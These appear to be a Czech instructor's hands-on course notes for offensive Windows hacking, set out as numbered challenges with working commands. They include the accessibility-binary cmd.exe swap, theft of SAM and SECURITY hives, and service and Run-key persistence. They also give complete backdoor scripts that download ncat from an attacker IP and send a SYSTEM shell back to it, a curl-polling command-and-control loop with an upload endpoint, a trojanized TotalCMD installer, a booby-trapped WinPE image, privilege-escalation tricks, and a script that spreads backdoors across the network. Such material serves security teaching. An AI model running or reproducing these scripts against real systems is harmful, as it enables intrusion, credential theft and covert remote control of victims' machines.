 9:00 - 10:30   10:45 - 12:00
13:00 - 14:30   14:45 - 16:00

\\lektor924\e$     poznamky.txt

Challenge 1
-----------
Úkol:	Dostaňte se do zařízení W10F bez znalosti hesla, pokud máme fyzický přístup k PC
Řešení: Off-line Attack
	Nabootujeme z externího média (CD, USB, NET, Recovery oddíl)
	Použijeme například instalační CD Windows (Windows PE)	
	Po nabootování stiskneme SHIFT + F10 -> spustíme CMD
	Přepneme se na disk D (D:), kde je nainstalován OS. Disk C je věnován zaváděcímu oddílu, který je  v běžících Windows skrytý
	Zkopírujeme CMD.EXE a přepíšeme jím jeden z následujících souborů:	
		\Windows\System32\
			osk.exe
			narrator.exe
			magnifier.exe
			utilman.exe
			sethc.exe
		CD \Windows\System32
		COPY X:\Windows\System32\cmd.exe .\osk.exe
	Zresetujeme PC a necháme nabootovat z HDD
	Na přihlašovací obrazovce spustíme z nástrojů pro usnadnění nástroj On-Screen Keyboard (osk.exe)
	Místo virtuální klávesnice se zobrazí CMD
	CMD běží pod účtem system, tudíž máme neomezená práva
	Změníme tedy heslo uživateli administrator
		NET USER administrator Pa$$w0rd /active:yes
	Případně skrz grafické prostředí:
		LUSRMGR.MSC
Obrana:	Schovat ikonu s nástroji pro usnadnění na přihlašovací obrazovce
	Zakázat bootování z externích médií
	Zaheslovat BIOS
	Ochrana fyzické bezpečnosti		
	Šifrování disků (BitLocker, VeraCrypt)
	Kontrola integrity systémových souborů

Registry Windows
----------------
Registry jsou perzistentní úložiště hodnot jednoduchých datových typů (čílsla, řatězce, apd.)
Registry mají stromovou strukturu, kde složkám říkáme klíče a "souborům" ríkáme hodnoty
Registry jsou relační databáze
Pro práci s registry v GUI můžeme použít nástroj REGEDIT
Základními klíči registrů jsou např.
	HKEY_USERS
		- V tomto klíči se nachází podklíče s hodnotami platnými pro jednotlivé uživatele
		- Uživatel má právo zápisu pouze do svého vlastního podklíče
	HKEY_CURRENT_USER
		- V tomto klíči jsou uloženy hodnoty, které se vztahují pouze na právě přihlášeného uživatele
		- Právo zápisu do tohoto klíče má právě přihlášený uživatel (a admini)
		- Jedná se pouze o symbolický odkaz do klíče přihlášeného uživatele v HKEY_USERS
	HKEY_LOCAL_MACHINE
		- Hodnoty se vztahují na všechny uživatele
		- Právo zápisu mají pouze administrátoři
		- V tomto klíče se nachází několik pro útočníky velmi zajímavých podklíčů
			- SAM		- Lokální uživatelské účty (přihlašovací údaje)
			- SECURITY	- Cache Credentials k doménovým účtům
			- SOFTWARE	- Mnoho Autorun lokací
					- Nejznámější autorun lokace HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run (RunOnce)	
			- SYSTEM	- Bootkey, konfigurace služeb
Klíče z HKLM josu uloženy na disku v \Windows\System32\Config
Soubory s registry není možné zkopírovat na běžícím systému
Klíče z HKEY_USERS jsou uloženy v profilech jednotlivých uživatelů (\Users\[user])
Pokud se nám podaří získat soubory s registry (cizí registry), není možné si je prohlédnout v běžném textovém editoru,
	ale je nutné si je připojit například do Regeditu
		- Označit klíč HKEY_LOCAL_MACHINE
		- Z menu vybrat File/Load Hive
		- Z disku vybrat soubor s cizími registry, který chceme připojit
		- Pojmenovat nově připojený klíč (např. CiziSW)
		- Po skončení práce je dobré připojené registry odpojit
		- Označíme klíč CiziSW
		- Zvolíme v menu File/Unload Hive
S registry je možné pracovat také z prostředí příkazové řádky pomocí příkazu REG
	REG /?
	REG QUERY HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
	REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v Notepad /t REG_SZ /d notepad.exe

S registry lze pracovat i vzdáleně (na jiných PC v síti)
	REG ADD \\student924-11\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v Pozdrav /t REG_SZ /d "Pozdrav od Romana"
Abychom mohli přistupovat ke vzdáleným registrům, musí být splněny následující podmínky:
	- Na vzdáleném PC musíte mít admin oprávnění
	- Na vzdáleném PC musí být na FW povolen přístup na RPC služby
	- Na vzdáleném PC musí běžet služba RemoteRegistry
		- Defaultně běžela na Windows XP
		- Ve Windows 7 byla tato služba defaultně zastavena
		- Ve Windows 10 je tato služba defaultně zakázána
Pokud jsou splněny první dvě podmínky, můžeme službu RemoteRegistry na vzdáleném PC povolit a nastartovat vzdáleně
	SC \\student924-11 CONFIG RemoteRegistry START= demand
	SC \\student924-11 START RemoteRegistry

Challenge 2
-----------
Úkol:	Ukradněte z PC oběti soubory registrů a získejte tak např. přihlašovací údaje
Řešení:	Off-line attack
	Nabootujeme z CD (Windows PE)
	Stiskem SHIFT+F10 vyvoláme CMD
	D:
	MKDIR \UkradeneRegistry
	CD \Windows\System32\config
	COPY S* \UkradeneRegistry\



Challenge 3
-----------
Úkol: 	Dostaňte se do PC, ke kterému máte fyzický přístup, ale je na něm prováděna kontrola integrity systémových souborů
Řešení:	Při Off-line útoku změníme registry (konkrétně do klíče Run vložíme hodnotu, která po restartu vytvoří nového uživatele)
	- Nabootujeme z CD (Windows PE)
	- Stiskem SHIFT+F10 vyvoláme CMD
	- Spustíme REGEDIT
	- Připojíme registry (SOFTWARE) z HDD
		- klikneme na HKLM
		- File / Load Hive
		- Vyhledáme D:\Windows\System32\config\SOFTWARE a připojíme ho jako CiziSW
		- Do klíče HKLM\CiziSW\Microsoft\Windows\CurrentVersion\RunOnce vložíme
			nocou řetězcovou hodnotu NewUser: NET USER reguser heslo /add
		- Odpojíme připojené registry
			- klikneme na CiziSW
			- File / Unload Hive
Nedostatek uvedeného řešení:
	- Uživatel vznikne až po té, co se na napadeném PC přihlásí někdo s administrátorským oprávněním

Challenge 4
-----------
Úkol:	Odstraňte nedostatek z předchozí Challenge, aby uživatel vzniknul okamžitě (samovolně) po restartu
Řešení:	Pomocí off-line útoku zeditujeme registry na napadeném PC
	Změníme binárku některé služby v její konfiguraci (aby se místo původní binárky, spustil náš příkaz)
		- Není možné změnit libovolnou službu
		- Vhodným adeptem na změnu bude služba, která:
			- se spouští automaticky při startu
			- spouští se pod systémem
			- nemá na sobě žádné závislosti
		- Vhodným adeptem bude služba Tiskový Subsystém (Print Spooler): Spooler
	- Off-Line Attack (nabootujeme do Windows PE)
	- Otevřeme regedit
	- Připojíme CiziSystem z HDD
	- Změníme ImagePath služby Spooler v HKLM\CiziSystem\ControlSet001\Services\Spooler
		- nastavíme na NET USER sluser abcdef /add
	- Odpojíme CiziSystem
	- Zresetujeme PC

Služby ve Windows
-----------------
Služby jsou neviditelné procesy běžící na pozadí
Služby je v GUI možné spravovat pomocí konzole SERVICES.MSC
Defultním uživatelským účtem pro běh služeb je lokální systém
Služby mohou startovat ještě dříve, než se na systému přihlásí nějaký uživatel (automatické startování)
V klíči SYSTEM najdete podklíče
	ControlSet001
	ControlSet002	(pouze do Windows 7)
	CurrentControlSet
	Select
Konfigurace služeb jsou uloženy v registrech v klíči HKLM\SYSTEM\ControlSet001(002)\Services
ControlSet001 a 002 se používal do Windows 7 kvůli poslední známé funkční konfiguraci
Který ControlSet je aktivní, je uvedeno v klíči Select
Aby nebylo nutné zjišťovat, který kontrol set je aktivní, je na běžícím systému k dispozici symbolický odkaz CurrentControlSet
CurrentControlSet není k dispozici během off-line útoku (je pouze na běžícím systému)
Pro správu služeb je nutné oprávnění administrátora
Služby můžeme spravovat i z příkazového řádku pomocí příkazu SC
	SC /?
	SC CREATE ntpsc binpath= notepad.exe
	SC START ntpsc
Binárky služeb musí být naprogramovány jako služby
Spouštění služeb probíhá prostřednictvím Service manageru, kterému musí spuštěná binárka odpověď, že se bez problému spustila
Pokud binárka service manageru neodpoví do 30s, je service managerem sestřelena
Ve chvíli, kdy spustíme nějakou binárku jako službu, běží tato pod systémovým účtem a zobrazený výstup se promítá na ploše uživatele system. Z toho důvodu žádný zobrazený výstup nevidíme.
30s pro běh služby může, ale také nemusí být dostatečně dlouhá doba
	- pokud budemem chtít vytvořit nového uživatele, který (pokud bude někdo pátrat v lozích) bude vytvořen uživatelem system, je 30s naprosto dostačujících
        - pokud bychom vytvořili službu, která smaže logy a tuto službu spustili, bude 30s také stačit. V logu vznikne záznam, že System smazal logy.
	- na druhou stranu, například pro běh backdooru jako služby by bylo 30s velice málo
Pokud budeme chtít, aby naše binárka běžela jako služba déle než 30s
	- Naprogramujeme binárku sami jako službu
	- Použijeme prostředníka, který odpoví service manageru namísto naší binárky
		- Takovým prostředníkem je například nástroj SRVANY.EXE z Windows Resource Kitu
		SC CREATE ntpnst binpath= srvany.exe
		REG ADD HKLM\SYSTEM\CurrentControlSet\Services\ntpnst\Parameters /v Application /t REG_SZ /d notepad.exe
		SC START ntpnst
Služby můžeme spravovat i vzdáleně (na jiných PC v síti)
Abychom mohli přistupovat ke vzdáleným službám, musí být splněny následující podmínky:
	- Na vzdáleném PC musíte mít admin oprávnění
	- Na vzdáleném PC musí být na FW povolen přístup na RPC služby

Challenge 5
-----------
Úkol: 	Zapište sousedovi do registrů (RunOnce) váš pozdrav
Řešení:	Pokud u souseda neběží služba RemoteRegistry, je nutné ji nastartovat
		SC \\student924-11 CONFIG RemoteRegistry START= demand
		SC \\student924-11 START RemoteRegistry
	Zapíšeme pozdrav do registrů
		REG ADD \\student924-11\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v Pozdrav /t REG_SZ /d "Pozdrav od souseda"

Challenge 6 - opakování
-----------------------
1) Vytvořte na svém PC nového uživatele jménem Sluzba, který pokud by někdo zkoumal logy, bude vytvořen uživatelem System

	SC CREATE Sluzba binpath= "NET USER sluzba 123456 /add"
	SC START Sluzba
	NET USER

2) Spusťte na svém PC nástroj Malování (mspaint.exe), aby tento běžel pod systémem neomezeně dlouho

	SC CREATE Malovani binpath= srvany.exe
	REG ADD HKLM\SYSTEM\CurrentControlSet\Services\Malovani\Parameters /v Application /t REG_SZ /d mspaint.exe
	SC START Malovani

3) Vytvořte u souseda nového uživatele jménem Hack, který pokud by někdo zkoumal logy, bude vytvořen uživatelem System

	SC \\student924-11 CREATE Sluzba2 binpath= "NET USER Hack 123456 /add"
	SC \\student924-11 START Sluzba2

4) Spusťte u souseda nástroj Malování (mspaint.exe), aby tento běžel pod systémem neomezeně dlouho

	SC \\student924-11 CREATE Malovani2 binpath= srvany.exe
	REG ADD \\student924-11\HKLM\SYSTEM\CurrentControlSet\Services\Malovani2\Parameters /v Application /t REG_SZ /d mspaint.exe
	SC \\student924-11 START Malovani2

Síťová komunikace
-----------------
klient-server

telnet www.seznam.cz 80

NCAT jako klient
	ncat www.seznam.cz 80
NCAT jako server
	ncat -lp 5000

Pomocí NCATu můžeme po síti tunelovat komunikaci libovolného nástroje
ve W10F spustíme server
	ncat -lp 443
ve Fyzickém PC
	ncat 192.168.56.10 443 -e cmd.exe

ve W10F spustíme server
	ncat -lp 443 -e cmd.exe
ve Fyzickém PC
	ncat 192.168.56.10 443



Challenge 7
-----------
Úkol:	Z fyzického PC v Gopasu napadněte svého souseda tak, že z PC souseda získáte CMD se systémovým oprávněním,
	kterou budete moci využívat neomezeně dlouho.

Řešení:	Spustíme si u sebe server
		NCAT -lp 443

	Otevřeme si novou CMD, ze které budeme provádět následující příkazy
	Vytvoříme u souseda novou službu spouštějící SRVANY
		SC \\student924-11 CREATE bighack binpath= srvany.exe

	Nakonfigurujeme u souseda SRVANY tak, aby spouštělo NCAT, který bude předávat CMD na server útočníka
		REG ADD \\student924-11\HKLM\SYSTEM\CurrentControlSet\Services\bighack\Parameters /v Application /t REG_SZ /d "NCAT lektor924 443 -e CMD.exe"

	Spustíme u souseda naší službu
		SC \\student924-11 START bighack

	Užíváme si vzdáleného přístupu

Nedostatky uvedeného řešení:
	- Musíme mít na PC oběti admin oprávnění
	- Neuvidíme svou oběť kvůli NATované IP adrese
	- Na PC oběti nebude k dispozici SRVANY a NCAT
	- Při pokusu o nahrání NCATu na PC oběti se pravděpodobně spustí poplach od antiviru

Challenge 8
-----------
Úkol:	Odstraňte všechny nedostatky předchozího řešení a proveďte reálný útok na svou oběť
Řešení:	Vytvoříme malware (backdoor)
		1) Stáhneme nástroje SRVANY a NCAT z webu od útočníka
		2) Vytvoříme lokální službu, která bude spouštět SRVANY
		3) Nakonfigurujeme lokální službu tak, aby SRVANY spouštělo NCAT
		4) Spustíme lokálně naší službu

	backdoor.bat
		CURL http://1.2.3.170/ncat.exe --output %windir%\ncat.exe
		CURL http://1.2.3.170/srvany.exe --output %windir%\srvany.exe
		SC CREATE backdoor binpath= srvany.exe
		REG ADD HKLM\SYSTEM\CurrentControlSet\Services\backdoor\Parameters /v Application /t REG_SZ /d "NCAT 1.2.3.170 443 -e CMD.exe"
		SC START backdoor

	Nahrajeme backdoor na web útočníka
		SCP backdoor.bat kali@192.168.56.170:/var/www/html

	Stáhneme backdoor u oběti
		CURL http://1.2.3.170/backdoor.bat --output backdoor.bat
Nevýhoda:
	Backdoor musí být spuštěn uživatelem s admin oprávněním. Bez tohoto oprávnění nemáme možnost spouštět obsažené příkazy.


Challenge 9
-----------
Úkol:	Upravte backdoor z předchozí challenge tak, aby CMD odešlo útočníkovi i po spuštění běžným uživatelem

Rešení:
	ECHO 1 > %SystemDrive%\test.txt
	IF EXIST %SystemDrive%\test.txt (
		DEL %SystemDrive%\test.txt
		CURL http://1.2.3.170/ncat.exe --output %windir%\ncat.exe
		CURL http://1.2.3.170/srvany.exe --output %windir%\srvany.exe
		SC CREATE backdoor binpath= srvany.exe
		REG ADD HKLM\SYSTEM\CurrentControlSet\Services\backdoor\Parameters /v Application /t REG_SZ /d "NCAT 1.2.3.170 443 -e CMD.exe"
		SC START backdoor
	) ELSE (
		CURL http://1.2.3.170/ncat.exe --output %temp%\ncat.exe
		%temp%\ncat.exe 1.2.3.170 443 -e CMD.exe
	)


Challenge 10
------------
Úkol:	Zbavte se nástroje SRVANY, použijte pouze to, co nabízí Windows v základu
Řešení:	Pokud budeme spouštět libovolnou binárku jako službu následujícím způsobem
		SC CREATE notepad1 binpath= notepad.exe
		SC START notepad1
	dojde po 30s k sestřelení služby (procecu notepad.exe), protože služba neodpověděla
	Pokud ale binárku spustíme skrz CMD následujícím způsobem
		SC CREATE notepad2 binpah= "CMD /k notepad.exe"
		SC START notepad2
	bude po 30s sestřelen pouze proces CMD, kdežto všechny další spuštěné procesy (notepad.exe) zůstanou dál běžet po neomezeně dlouhou dobu

Challenge 11
------------
Úkol:	Zbavte se nástroje NCAT, použijte pouze to, co nabízí Windows v základu
Řešení:
	Vytvoříme nekonečnou smyčku, která bude v pravidelných intervalech:
		- stahovat příkaz z webu útočníka
		- vykonávat tento příkaz v CMD
		- výsledek ukládat do souboru
		- odesílat tento soubor útočníkovi

	FOR /L %i IN (0,0,1) DO CURL http://192.168.56.170/command.txt | CMD > %temp%\output.txt && CURL --form file=@%temp%\output.txt http://192.168.56.170/save.php && TIMEOUT /t 10

	save.php
	<?php
	  if (filesize($_FILES["file"]["tmp_name"]) > 150) {
        	  move_uploaded_file($_FILES["file"]["tmp_name"], $_FILES["file"]["name"]);
	          file_put_contents("command.txt","");
	  }
	?>

Challenge 12
------------
Úkol:	Nasaďte backdoor z předchozí challenge jako službu
Řešení:
	SC CREATE backdoor2 binpath= "CMD /c CMD /c \"FOR /L %i IN (0,0,1) DO CURL http://192.168.56.170/command.txt ^| CMD ^> %temp%\output.txt ^&^& CURL --form file=@%temp%\output.txt http://192.168.56.170/save.php ^&^& TIMEOUT /t 10\""
	SC START backdoor2


Challenge 13
------------
Úkol:	Vytvořte portable aplikaci (TotalCMD), která kromě své legitimní funkčnosti, bude obsahovat backdoor
Řešení:	Vytvoříme samorozbalovací archiv
	Microsoft nabízí přímo ve Windows nástroj iexpress
	Do archivu vložíme legitimní exe soubor, např. TotalCMD.exe, náš backdoor (backdoor.cmd) a případné další věci
	Při tvorbě archivu nastavíme instalační program (TotalCMD) a post-instalační příkaz (backdoor.cmd)
	Výslednému archivu můžeme změnit ikonu např. nástrojem Resource Hacker
	Výsledný archiv můžeme distribuovat
	Po stažení a spuštění se obsah rozbalí do tempu a spustí se instalační program (TotalCMD)
	Po uzavření TotalCMD se spustí post-instalační příkaz (backdoor.cmd), který odešle CMD útočníkovi

Privilege Escalation
--------------------

Challenge 14
------------
Úkol:	Navyšte si oprávnění z ničeho na System bez toho, že byste měli fyzický přístup k cílovému PC
Řešení: Off-line útok pomocí bootovatelného média, které si stáhne a nabootuje z něj naše oběť

	Vytvoříme vlastní upravené Windows PE
	Microsoft na tvorbu vlastních Windows PE poskytuje nástroj Windows ADK
	Úkolem našich upravených Windows PE bude zresetovat heslo administratora (legitimní část) a nasadit na PC oběti backdoor (skrytá funkcionalita)
	Vytvoříme si dva soubory: startnet.cmd, který se spustí v kontextu Windows PE a attack.bat, který se spustí po restartu pod systémem v kontextu nainstalovaného systému

	STARTNET.CMD
	------------
	Spustí se v kontextu Windows PE
	1) Zkopírujeme soubory ncat.exe, srvany.exe a attack.bat z CD na HDD
	2) Připojíme registry (SYSTEM) z HDD
	3) Změníme konfiguraci služby Spooler, aby se při bootování (po restartu) spustil pod systémem Attack.bat
	4) Odpojíme připojené registry
	5) Smažeme obsah obrazovky
	6) Vypíšeme "Heslo administratora bylo nastaveno na heslo"
	7) Počkáme na stisk klávesy
	8) Zavřeme okno (restart)

	@ECHO OFF
	COPY ncat.exe D:\Windows\ncat.exe /y
	COPY srvany.exe D:\Windows\srvany.exe /y
	COPY attack.bat D:\Windows\attack.bat /y
	REG LOAD HKLM\CiziSystem D:\Windows\System32\config\SYSTEM
	REG ADD HKLM\CiziSystem\ControlSet001\Services\Spooler /v ImagePath /t REG_SZ /d "CMD /c CMD /c C:\Windows\attack.bat" /f
	REG UNLOAD HKLM\CiziSystem
	CLS
	ECHO Heslo administratora bylo nastaveno na "heslo"
	PAUSE
	EXIT


	ATTACK.BAT
	----------
	Spustí se pod systémem v kontextu nainstalovaného systému
	1) Změní heslo administrátora na "heslo"
	2) Vytvoříme novou službu s backdoorem
	3) Spustíme backdoor
	4) Vrátíme do původního stavu službu Spooler

	NET USER administrator heslo /active:yes
	SC CREATE attack binpath= "CMD /c CMD /c NCAT 1.2.3.170 5000 -e CMD.exe" start= delayed-auto
	SC START attack
	REG ADD HKLM\SYSTEM\CurrentControlSet\Services\Spooler /v ImagePath /t REG_SZ /d spoolsv.exe /f
	DEL C:\Windows\attack.bat


	Spustíme pod adminem nástroj Deployment and Imaging Tools Environment
	copype amd64 C:\WinPE_amd64
	Dism /Mount-Image /ImageFile:"C:\WinPE_amd64\media\sources\boot.wim" /index:1 /MountDir:"C:\WinPE_amd64\mount"
	Nakopírujeme soubory ncat.exe, srvany.exe, attack.bat a startnet.cmd do složky C:\WinPE_amd64\mount\Windows\System32
	Dism /Unmount-Image /MountDir:"C:\WinPE_amd64\mount" /commit
	MakeWinPEMedia /ISO C:\WinPE_amd64 C:\WinPE_amd64\MagicCD.iso


Challenge 15 (Word-Write binárky služeb)
----------------------------------------
Úkol:	Navyšte si oprávnění z účtu běžného uživatele, který spustil váš TotalCMD a poslal vám svou CMD na systémové oprávnění
Řešení:
	WMIC service get *
	WMIC service get name,pathname,startname
	WMIC service get name,pathname,startname | FINDSTR /i /v system32
	ICACLS D:\Temp\GDSClient\srvany.exe
	REG QUERY HKLM\SYSTEM\CurrentControlSet\Services\GDSClient_Service\Parameters
	ICACLS D:\Temp\GDSClient\GDSClient_Service.bat
	TYPE D:\Temp\GDSClient\GDSClient_Service.bat
	ICACLS D:\Temp\GDSClient\GDS_Service.ps1
	TYPE D:\Temp\GDSClient\GDS_Service.ps1


	ECHO CURL http://1.2.3.170/ncat.exe --output C:\Windows\ncat.exe > D:\Temp\GDSClient\GDSClient_Service.bat
	ECHO NCAT 1.2.3.170 6000 -e CMD.exe >> D:\Temp\GDSClient\GDSClient_Service.bat
	TYPE D:\Temp\GDSClient\GDSClient_Service.bat

	SC STOP GDSClient_Service
	SC START GDSClient_Service

	SHUTDOWN /r /f /t 0

Challenge 16 (Unquoted Path)
----------------------------
Úkol:	Navyšte si oprávnění z účtu běžného uživatele, který spustil váš TotalCMD a poslal vám svou CMD na systémové oprávnění
	jiným způsobem než přes veřejně zapisovatelné binárky služeb

Řešení:
	WMIC service get name,pathname,startname | FINDSTR /i /v system32
	
	odhalíme službu jejíž cesta k binárce obsahuje mezery a není uzavřena v uvozovkách
	c:\Program Files\stupidservice\blbe udelane\srvany.exe 

	Pokud by na C:\ ležel soubor Program.exe, dostal by přednost a spustil by se. Zbytek cesty by mu byl předán jako parametry.
	Pokud by v adresáři "C:\Program Files\stupidservice" ležel soubor blbe.exe, dostal by přednost a spustil by se. Zbytek cesty by mu byl předán jako parametry.
	Zkontrolujeme, zda můžeme zapisovat do C:\ nebo do "C:\Program Files\stupidservice"
		ICACLS "c:\Program Files\stupidservice"
	Pokud ano, vložíme do složky náš útočný soubor blbe.exe, který se spustí po resartu jako služba
	Vytvoříme si útočný blbe.bat, který následně zkonvertujeme na exe nástrojem bat2exe

	blbe.bat
		timeout /t 10
		CURL http://1.2.3.170/ncat.exe --output C:\Windows\ncat.exe
		ncat 1.2.3.170 7000 -e cmd.exe

	Nástrojem bat2exe zkonvertujeme na blbe.exe
	Uploadneme blbe.exe na náš webový server
		SCP blbe.exe kali@192.168.56.170:/var/www/html

	Skrz vzdálenou CMD naší oběti stáhneme blbe.exe do adresáře "c:\Program Files\stupidservice"
		CURL http://1.2.3.170/blbe.exe --output "c:\Program Files\stupidservice\blbe.exe"

	Spustíme si server na portu 7000
		ncat -lp 7000

	Zrestartujeme PC oběti
		SHUTDOWN /r /f /t 0

Challenge 17 (Zranitelnosti OS umožňující privilege escalation)
---------------------------------------------------------------
Úkol:	Zjistěte, zda cílový systém, na který máme přístup skrz CMD běžného uživatele, netrpí známými zranitelnostmi
	v produktech Microsoftu, které bychom mohli zneužít pro navýšení oprávnění

Řešení:	Zjistíme, jaké záplaty od Microsoftu jsou aplikovány na cílovém systému
		SYSTEMINFO > %temp%\systeminfo.txt
	Odešleme systeminfo.txt útočníkovi
		CURL --form file=@%temp%\systeminfo.txt http://1.2.3.170/save.php
	Zjistíme, jaké záplaty Microsoft vydal
		wes --update
	Porovnáme aplikované záplaty s vydanými, čímž odhalíme chybějící záplaty
		wes systeminfo.txt
	Zjistíme, jaké chyby opravují chybějící záplaty, čímž zjistíme zranitelnosti, kterými trpí cílový systém

Challenge 18
------------
Úkol:	Zjistěte automatizovaně, zda cílový systém netrpí zranitelnostmi (například díky špatné konfiguraci),
	které by umožnili navýšení oprávnění

Řešení:	Na cílovém systému spustíme nástroj WINPEAS (LINPEAS)
		CURL https://raw.githubusercontent.com/peass-ng/PEASS-ng/refs/heads/master/winPEAS/winPEASbat/winPEAS.bat --output winPEAS.bat | CMD > %temp%\output.txt
		CURL --form file=@%temp%\output.txt http://1.2.3.170/save.php

Challenge 19
------------
Úkol:	Navyšte si oprávnění z běžného uživatele na administrátora (doménového administrátora)
	Cíl útoku: vytvořit nového doménového uživatele

Řešení:	Připravíme na administrátora pastičku, která sklapne při přihlášení admina k systému (past se spustí pod účtem přihlášeného uživatele - admina)
	Past musíme umístit do takového umístění, které je perzistentní a zajišťuje automatické spuštění pod právy přihlášeného uživatele
		- Registry: 		HKLM\Software\Microsoft\Windows\CurrentVersion\Run (RunOnce)
		- Složka StartUp:	C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
		- atd.
	Pro zápis do perzistentních oblastí, které se vztahují na všechny uživatele, je potřeba mít vyšší oprávnění
	Nejprve bude nutné provést privilege escalation na účet System, který nám umožní zápis do perzistentních oblastí

	Vytvoříme BAT soubor ve složce STARTUP, jehož úkolem bude vytvořit nového doménového uživatele

	ECHO NET USER hackdomain heslo /add /domain > "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\past.bat"
	ECHO DEL "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\past.bat" >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\past.bat"
	TYPE "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\past.bat"

Challenge 20
------------
Úkol:	Identifikujte na síti všechna živá zařízení (IP adresy)
	Bez použití externích nástrojů

	Sekvenčně:
		FOR /L %i IN (1,1,254) DO PING 192.168.56.%i
		FOR /L %i IN (1,1,254) DO @PING -n 1 -w 100 192.168.56.%i | FINDSTR Reply
	Paralelně:
		FOR /L %i IN (1,1,5) DO START CMD /k "PING -n 1 -w 100 192.168.56.%i"
		FOR /L %i IN (1,1,254) DO @START /min CMD /c "PING -n 1 -w 100 192.168.56.%i"
		ARP -a
	
Challenge 21
------------
Úkol:	Vytvořte past, která po přihlášení administrátora na napadené stanici nasadí backdoor na všechna zařízení v síti
Řešení: Vytvoříme soubor past.bat, který vložíme na napadené stanici do složky StartUp a počkáme na přihlášení admina.
	
past.bat
	1) Zjistíme, jakou IP adresu má naše oběť
	2) Provedeme Live sken sítě, abychom zjistili živá zařízení v síti
	3) U každého zařízení ověříme, zda na něm máme admin práva
	4) Tam kde máme admin práva
		- nakopírujeme na takové zařízení NCAT a SRVANY
		- Vytvoříme novou službu, která bude spouštět backdoor
		- Službu nastartujeme

	@ECHO OFF
	CURL http://1.2.3.170/ncat.exe --output %temp%\ncat.exe
	CURL http://1.2.3.170/srvany.exe --output %temp%\srvany.exe
	FOR /F "tokens=14" %%i IN ('"IPCONFIG | FINDSTR IPv4"') DO SET ip=%%i
	FOR /F "tokens=1,2,3 delims=." %%a IN ("%ip%") DO SET segment=%%a.%%b.%%c
	FOR /L %%i IN (1,1,254) DO @START /min CMD /c "PING -n 1 -w 100 %segment%.%%i"
	TIMEOUT /t 5
	SET port=10000
	SETLOCAL ENABLEDELAYEDEXPANSION
	FOR /F "tokens=1" %%i IN ('"ARP -a | FINDSTR %segment% | FINDSTR /v Interface | FINDSTR /v 255"') DO (
		IF EXIST \\%%i\admin$\system.ini (
			COPY %temp%\ncat.exe \\%%i\admin$\ncat.exe /y
			COPY %temp%\srvany.exe \\%%i\admin$\srvany.exe /y
			SC \\%%i CREATE multi binpath= srvany.exe
			REG ADD \\%%i\HKLM\SYSTEM\CurrentControlSet\Services\multi\Parameters /v Application /t REG_SZ /d "ncat 1.2.3.170 !port! -e cmd.exe" /f
			SC \\%%i START multi
			SET /A port+=1
		)
	)
	ENDLOCAL

	Nahrajeme past.bat na server útočníka
		SCP past.bat kali@192.168.56.170:/var/www/html
	Nejprve je potřeba provést Privilege escalation na System
	Následně pod systémem stáhneme past od útočníka a zapíšeme ji do složky Startup
		CURL http://1.2.3.170/past.bat --output "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\past.bat"
	Spustíme si na jednotlivých tabech v linuxovém terminálu servery na portech 10000-10006
		ncat -lp 10000
	Zresetujeme uživateli PC
		SHUTDOWN /r /f /t 0


Challenge 22 (Live scan)
------------
Úkol:	Identifikujte na síti všechna živá zařízení (IP adresy)
	Pomocí specializovaného nástroje (NMAP)

Řešení:
	nmap -n -sn 192.168.56.1-254
	nmap -n -sn 192.168.56.0/24

Challenge 23 (OS detect)
------------
Úkol:	Identifikujte operační systémy na živých zařízeních
Řešení:
	Bez použití externích nástrojů
		pomocí PINGu zkontrolovat hodnotu TTL (nebližší vyšší násobek 32)
			64  = Unix
			128 = Windows
		
	S využitím NMAPu
		nmap -O 192.168.56.1
		nmap -O 192.168.56.0/24

	Alternativa:
		XProbe
		p0f

Challenge 24 (Port scan)
------------
Úkol:	Identifikujte účel živých zařízeních v síti
Řešení:	Skenování otevřených portů

	Bez použití externích nástrojů
		FOR %i IN (21,22,25,53,80,88,110,135,139,143,445,8080) DO START CMD /c "NCAT 192.168.56.12 %i"
	S využitím NMAPu
		-sS	SYN scan
		-sT	Connect scan

	nmap -sS 192.168.56.12
	nmap -sS 192.168.56.12 -p 21,22,25,53,80,88,110,135,139,143,445,8080 --open
	nmap -sS 192.168.56.12 -p 100-200	Sken portů od 100 do 200
	nmap -sS 192.168.56.12 -p -200		Sken portů od 1 do 200
	nmap -sS 192.168.56.12 -p 50000-	Sken portů od 50000 do 65535
	nmap -sS 192.168.56.12 -p -		Sken všech 65535 portů

	nmap -sV 192.168.56.12			Banner grabbing - identifikace běžících služeb (včetně verze SW)

	nmap -sS 192.168.56.0/24 -p 22 --open
	nmap -sS 192.168.56.0/24 -p 80,443 --open
	nmap -sS 192.168.56.0/24 -p 25,110,143 --open



Challenge 25 (Vulnerability scan)
------------
Úkol:	Zjistěte zda některá ze služeb na serveru 192.168.56.12 netrpí známou zranitelností

Řešení:
	Manuálně
		Pokud po připojení ke službě zjistíme její název a verzi, můžeme známé zranitelnosti dohledat například v CVE databázi
			www.cvedetails.com
		Pro dohledání exploitů můžete použít například:
			web www.exploit-db.com
			nástroj searchsploit
	Automatizovaně
		Pomocí specializovaných Vulnerability scannerů
			Nessus
			OpenVas
			...
			Nmap

		Nmap není profy nástroj na vulnerability scan, ale pro jednoduchý test jej můžeme použít
		NMap je framework, pomocí kterého můžete skenovat téměř cokoliv - pomocí nse skriptů
			/usr/share/nmap/scripts

		Pro spuštění vulnerability skenu můžeme použít příkaz
			nmap --script=*vuln* 192.168.56.12


Challenge 25 (Exploitace zranitelností)
------------
Úkol: 	Zneužijte zranitelnost MS17-010 identifikovanou na serveru 192.168.56.12

Řešení:	Použijeme framework pro exploitaci Metasploit

	msfcosole
		search ms17-010
		use 2
		show options
		set rhost 192.168.56.12
		show options
		set payload windows/shell/reverse_tcp
		show options
		exploit

Challenge 26 (Guessing)
-----------------------
Úkol:	Zjistěte heslo uživatele administrator na W10F z fyzického PC bez použití externích nástrojů

Řešení: Uhodnutí správného hesla (Guessing)

	NET USE \\192.168.56.10\c$ /user:administrator password

